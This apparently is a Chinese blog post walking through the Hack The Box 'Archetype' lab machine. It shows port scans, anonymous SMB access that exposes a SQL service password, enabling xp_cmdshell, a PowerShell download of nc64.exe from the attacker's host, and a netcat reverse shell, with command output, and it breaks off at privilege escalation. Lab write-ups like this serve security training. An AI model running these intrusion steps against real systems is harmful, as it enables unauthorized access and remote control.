@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        HTB-Archetype | FlowsecNagi's Home
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E7%A2%8E%E7%A2%8E%E5%BF%B5">反抗者</a>
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">逃亡之路</a>
+            
+              <a class="nav-menu-item" href="/%E5%8E%AE%E6%9D%80%E6%88%98%E5%9C%BA">战场</a>
+            
+              <a class="nav-menu-item" href="/%E7%A7%91%E7%A0%94">研究所</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">HTB-Archetype</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/%E7%AC%94%E8%AE%B0/" class="post-tag">#笔记</a>
+  
+    <a href="/tags/HTB/" class="post-tag">#HTB</a>
+  
+    <a href="/tags/STARTING-POINT/" class="post-tag">#STARTING POINT</a>
+  
+
+
+          <span class="post-date">2023-07-18</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <p>开局先找汉语教：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40927195/article/details/125819540">HTB_Archetype靶机之sqlserver提权_重返太空的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.czfq99.cn/archives/94.html">https://www.czfq99.cn/archives/94.html</a></p>
+<p>看了下标题好像是SQLSERVER的提权。</p>
+<p>开始了，开局先扫端口吧，看看开启了哪些：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ nmap -sV 10.129.121.52                     <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 04:02 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.121.52<br>Host is up (0.37s latency).<br>Not shown: 996 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE      VERSION<br>135/tcp  open  msrpc        Microsoft Windows RPC<br>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br>445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br>1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000<br>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 77.41 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ nmap -sV -sC 10.129.168.67                                   <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 03:34 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.168.67<br>Host is up (0.37s latency).<br>Not shown: 996 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE      VERSION<br>135/tcp  open  msrpc        Microsoft Windows RPC<br>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br>445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds<br>1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM<br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| Not valid before: 2023-07-18T06:36:33<br>|_Not valid after:  2053-07-18T06:36:33<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-07-18T07:37:27+00:00; -1s from scanner time.<br>| ms-sql-info: <br>|   10.129.168.67:1433: <br>|     Version: <br>|       name: Microsoft SQL Server 2017 RTM<br>|       number: 14.00.1000.00<br>|       Product: Microsoft SQL Server 2017<br>|       Service pack level: RTM<br>|       Post-SP patches applied: <span class="hljs-literal">false</span><br>|_    TCP port: 1433<br>| ms-sql-ntlm-info: <br>|   10.129.168.67:1433: <br>|     Target_Name: ARCHETYPE<br>|     NetBIOS_Domain_Name: ARCHETYPE<br>|     NetBIOS_Computer_Name: ARCHETYPE<br>|     DNS_Domain_Name: Archetype<br>|     DNS_Computer_Name: Archetype<br>|_    Product_Version: 10.0.17763<br>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: mean: 1h23m59s, deviation: 3h07m52s, median: -1s<br>| smb-os-discovery: <br>|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)<br>|   Computer name: Archetype<br>|   NetBIOS computer name: ARCHETYPE\x00<br>|   Workgroup: WORKGROUP\x00<br>|_  System time: 2023-07-18T00:37:03-07:00<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-07-18T07:37:00<br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 162.12 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开了135、139、445、1433，第三个Dancing靶机有介绍过SSM的。</p>
+<ul>
+<li>135 端口是远程过程调用 (RPC) 端口 ，Client-Server Model(客户端-服务器应用程序)</li>
+<li>139 端口是 netbios-ssn，NetBIOS 是在所有当前版本 Windows 下用于文件和打印共享的协议，默认情况下，启用文件和打印共享后，会绑定到所有内容，包括 TCP&#x2F;IP ,这意味着除非配置不当的情况下，可以在互联网上访问本地的共享资源</li>
+<li>445 端口 microsoft-ds 服务，也是 Client-Server Model，用于直接 TCP&#x2F;IP MS 网络访问，无需 NetBIOS 层，SMB 协议用于 Windows NT&#x2F;2K&#x2F;XP 和更高版本中的文件共享</li>
+</ul>
+<blockquote>
+<p><strong>使用命令行工具 smbclient 进行连接，使用 -L 命令显示服务器端分享的资源。</strong></p>
+</blockquote>
+<p>密码为空，直接进看看。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ smbclient -L 10.129.121.52                                                                 <br>Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:<br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        backups         Disk      <br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to 10.129.121.52 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br></code></pre></td></tr></table></figure>
+
+<p>有了Dancing的经验直接连backups，无密码直连，下载<code>prod.dtsConfig</code>文件到本地再看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ smbclient \\\\10.129.121.52\\backups<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Mon Jan 20 07:20:57 2020<br>  ..                                  D        0  Mon Jan 20 07:20:57 2020<br>  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020<br><br>                5056511 blocks of size 4096. 2616219 blocks available<br>smb: \&gt; <span class="hljs-built_in">cat</span> prod.dtsConfig<br><span class="hljs-built_in">cat</span>: <span class="hljs-built_in">command</span> not found<br>smb: \&gt; get prod.dtsConfig<br>getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)<br></code></pre></td></tr></table></figure>
+
+<p>这到底是什么东西啊</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">cat</span> prod.dtsConfig <br>&lt;DTSConfiguration&gt;<br>    &lt;DTSConfigurationHeading&gt;<br>        &lt;DTSConfigurationFileInfo GeneratedBy=<span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageName=<span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageID=<span class="hljs-string">&quot;...&quot;</span> GeneratedDate=<span class="hljs-string">&quot;20.1.2019 10:01:34&quot;</span>/&gt;<br>    &lt;/DTSConfigurationHeading&gt;<br>    &lt;Configuration ConfiguredType=<span class="hljs-string">&quot;Property&quot;</span> Path=<span class="hljs-string">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> ValueType=<span class="hljs-string">&quot;String&quot;</span>&gt;<br>        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;<br>    &lt;/Configuration&gt;<br>&lt;/DTSConfiguration&gt;<br></code></pre></td></tr></table></figure>
+
+<p>噢，是sql server，关系型数据库</p>
+<p>同时发现敏感信息(mssql的账号密码)</p>
+<p><strong>ID:ARCHETYPE\sql_svc</strong></p>
+<p><strong>Password:M3g4c0rp123</strong></p>
+<blockquote>
+<p>如何连接呢，使用推荐工具 <code>impacket</code> 包连接，<code>kali</code> 中自带，<code>windwos</code> 可以使用 <code>sqlserver management</code> 桌面管理工具。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ impacket-mssqlclient -h<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE]<br>                      [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]<br>                      target<br><br>TDS client implementation (SSL supported).<br><br>positional arguments:<br>  target                [[domain/]username[:password]@]&lt;targetName or address&gt;<br><br>options:<br>  -h, --<span class="hljs-built_in">help</span>            show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span><br>  -port PORT            target MSSQL port (default 1433)<br>  -db DB                MSSQL database instance (default None)<br>  -windows-auth         whether or not to use Windows Authentication (default False)<br>  -debug                Turn DEBUG output ON<br>  -file FILE            input file with commands to execute <span class="hljs-keyword">in</span> the SQL shell<br><br>authentication:<br>  -hashes LMHASH:NTHASH<br>                        NTLM hashes, format is LMHASH:NTHASH<br>  -no-pass              don<span class="hljs-string">&#x27;t ask for password (useful for -k)</span><br><span class="hljs-string">  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based</span><br><span class="hljs-string">                        on target parameters. If valid credentials cannot be found, it will use the ones</span><br><span class="hljs-string">                        specified in the command line</span><br><span class="hljs-string">  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)</span><br><span class="hljs-string">  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN)</span><br><span class="hljs-string">                        specified in the target parameter</span><br></code></pre></td></tr></table></figure>
+
+<p>有了账户密码直连就行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc@10.129.121.52<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>Password:<br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192<br>[*] INFO(ARCHETYPE): Line 1: Changed database context to <span class="hljs-string">&#x27;master&#x27;</span>.<br>[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.<br>[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) <br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>SQL&gt; <span class="hljs-built_in">help</span><br><br>     lcd &#123;path&#125;                 - changes the current <span class="hljs-built_in">local</span> directory to &#123;path&#125;<br>     <span class="hljs-built_in">exit</span>                       - terminates the server process (and this session)<br>     enable_xp_cmdshell         - you know what it means<br>     disable_xp_cmdshell        - you know what it means<br>     xp_cmdshell &#123;cmd&#125;          - executes cmd using xp_cmdshell<br>     sp_start_job &#123;cmd&#125;         - executes cmd using the sql server agent (blind)<br>     ! &#123;cmd&#125;                    - executes a <span class="hljs-built_in">local</span> shell cmd<br></code></pre></td></tr></table></figure>
+
+<aside>
+💡 Here's two great articles that can guide us further to our exploration journey with MSSQL Server:
+
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></p>
+<p><a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></p>
+</aside>
+
+<p>这数据库似乎也没什么东西，下一步就是提权。</p>
+<p>使用xp_cmdshell工具执行系统命令，<code>xp_cmdshell</code> 可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，是 <code>sql servevr</code> 的原生工具。</p>
+<p>然后报错发现没开启权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">xp_cmdshell <span class="hljs-string">&quot;whoami&quot;</span><br><br>[-] ERROR(ARCHETYPE): Line 1: Incorrect syntax near <span class="hljs-string">&#x27;&gt;&#x27;</span>.<br></code></pre></td></tr></table></figure>
+
+<p>使用如下命令修改配置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">SQL&gt; EXECUTE sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, 1;<br>SQL&gt; RECONFIGURE;<br>SQL&gt; EXECUTE sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, 1;<br>SQL&gt; RECONFIGURE;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">SQL&gt; SELECT is_srvrolemember(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);<br>              <br><br>-----------   <br><br>          1   <br><br>SQL&gt; EXEC xp_cmdshell <span class="hljs-string">&#x27;net user&#x27;</span>;<br>[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure <span class="hljs-string">&#x27;sys.xp_cmdshell&#x27;</span> of component <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> because this component is turned off as part of the security configuration <span class="hljs-keyword">for</span> this server. A system administrator can <span class="hljs-built_in">enable</span> the use of <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> by using sp_configure. For more information about enabling <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, search <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> <span class="hljs-keyword">in</span> SQL Server Books Online.<br>SQL&gt; EXEC sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, 1;<br>[*] INFO(ARCHETYPE): Line 185: Configuration option <span class="hljs-string">&#x27;show advanced options&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.<br>SQL&gt; RECONFIGURE;<br>SQL&gt; sp_configure; - Enabling the sp_configure as stated <span class="hljs-keyword">in</span> the above error message<br>[-] ERROR(ARCHETYPE): Line 1: Incorrect syntax near <span class="hljs-string">&#x27;-&#x27;</span>.<br>SQL&gt; EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, 1;<br>[*] INFO(ARCHETYPE): Line 185: Configuration option <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.<br>SQL&gt; RECONFIGURE;<br>SQL&gt; xp_cmdshell <span class="hljs-string">&quot;whoami&quot;</span><br>output                                                                             <br><br>--------------------------------------------------------------------------------   <br><br>archetype\sql_svc                                                                  <br><br>NULL<br></code></pre></td></tr></table></figure>
+
+<p>查看当前目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">SQL&gt; xp_cmdshell <span class="hljs-string">&quot;powershell -c pwd&quot;</span><br>output                                                                             <br><br>--------------------------------------------------------------------------------   <br><br>NULL                                                                               <br><br>Path                                                                               <br><br>----                                                                               <br><br>C:\Windows\system32                                                                <br><br>NULL                                                                               <br><br>NULL                                                                               <br><br>NULL                                                                               <br><br>SQL&gt;<br></code></pre></td></tr></table></figure>
+
+<p>网慢的不行，下载菜刀64都是在自己机子开VPN下的，而且放在桌面不行，必须要把菜刀放在当前路径下，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">SQL&gt; xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.68/nc64.exe -outfile nc64.exe&quot;</span><br>output                                                                             <br><br>--------------------------------------------------------------------------------   <br><br>wget : &lt;!DOCTYPE HTML&gt;                                                             <br><br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;                                                                   <br><br>    &lt;<span class="hljs-built_in">head</span>&gt;                                                                         <br><br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;                                                     <br><br>        &lt;title&gt;Error response&lt;/title&gt;                                              <br><br>    &lt;/head&gt;                                                                        <br><br>    &lt;body&gt;                                                                         <br><br>        &lt;h1&gt;Error response&lt;/h1&gt;                                                    <br><br>        &lt;p&gt;Error code: 404&lt;/p&gt;                                                     <br><br>        &lt;p&gt;Message: File not found.&lt;/p&gt;                                            <br><br>        &lt;p&gt;Error code explanation: 404 - Nothing matches the given URI.&lt;/p&gt;        <br><br>    &lt;/body&gt;                                                                        <br><br>&lt;/html&gt;                                                                            <br><br>At line:1 char:32                                                                  <br><br>+ ... sql_svc\Downloads; wget http://10.10.14.68/nc64.exe -outfile nc64.exe        <br><br>+                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~        <br><br>    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc    <br><br>   eption                                                                          <br><br>    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand   <br><br>NULL                                                                               <br><br>SQL&gt; xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.68/nc64.exe -outfile nc64.exe&quot;</span><br>output                                                                             <br><br>--------------------------------------------------------------------------------   <br><br>NULL                                                                               <br><br>SQL&gt;<br></code></pre></td></tr></table></figure>
+
+<p>监听终于返回200成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo python3 -m http.server 80<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.129.168.67 - - [18/Jul/2023 04:26:15] code 404, message File not found<br>10.129.168.67 - - [18/Jul/2023 04:26:15] <span class="hljs-string">&quot;GET /nc64.exe HTTP/1.1&quot;</span> 404 -<br>10.129.168.67 - - [18/Jul/2023 04:39:58] code 404, message File not found<br>10.129.168.67 - - [18/Jul/2023 04:39:58] <span class="hljs-string">&quot;GET /nc64.exe HTTP/1.1&quot;</span> 404 -<br>10.129.168.67 - - [18/Jul/2023 04:41:07] <span class="hljs-string">&quot;GET /nc64.exe HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure>
+
+<p>现在，我们可以通过nc将cmd.exe绑定到我们的侦听器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SQL&gt;  xp_cmdshell <span class="hljs-string">&quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.68 443&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>下面直接看nc监听443端口，获取到了shell会话：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [10.10.14.68] from (UNKNOWN) [10.129.168.67] 49678<br>Microsoft Windows [Version 10.0.17763.2061]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Users\sql_svc\Downloads&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is 9565-0B4F<br><br> Directory of C:\Users\sql_svc\Downloads<br><br>07/18/2023  01:41 AM    &lt;DIR&gt;          .<br>07/18/2023  01:41 AM    &lt;DIR&gt;          ..<br>07/18/2023  01:41 AM            45,272 nc64.exe<br>               1 File(s)         45,272 bytes<br>               2 Dir(s)  10,714,288,128 bytes free<br><br>C:\Users\sql_svc\Downloads&gt;<span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>archetype\sql_svc<br></code></pre></td></tr></table></figure>
+
+<p>还是没权限，哈哈</p>
+<p>介绍提权工具：WINPEAS，还是开VPN下载的，windows还要关病毒防护</p>
+<p>然后在监听处发现200成功：</p>
